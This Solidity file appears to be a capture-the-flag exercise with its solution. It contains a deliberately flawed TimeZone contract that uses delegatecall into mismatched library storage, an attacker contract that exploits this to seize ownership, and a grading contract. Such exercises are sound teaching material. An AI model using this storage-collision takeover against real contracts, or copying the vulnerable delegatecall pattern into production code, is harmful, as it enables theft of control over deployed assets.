
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
// 尝试着去获取owner
contract LibraryContract {
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
contract TimeZone {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor() public {
        timeZone1Library = address(new LibraryContract());
        timeZone2Library = address(new LibraryContract());
        owner = msg.sender;
    }
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }
}
contract att{
    Check che;
    TimeZone time;
    address owner;
    constructor(Check addr) public {
        che = addr;
        time = che.timeZone();
        
    }
    function attrat() public  {
        time.setFirstTime(uint256(uint160(address(this))));
        time.setFirstTime(uint256(uint160(address(this))));
        che.isCompleted();
    }
    function setTime(uint256 addr) public  {
        owner = address(addr);
    }
}

contract Check {
    uint256 public score;
    TimeZone public timeZone;
    constructor() public {
        timeZone = new TimeZone();
    }
    function isCompleted() public {
        score = 0;
        if (isContract(msg.sender)) {
            score = score + 25;
        }
        if (timeZone.owner() == msg.sender) {
            score = score + 75;
        }
    }
    function isContract(address addr) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }
}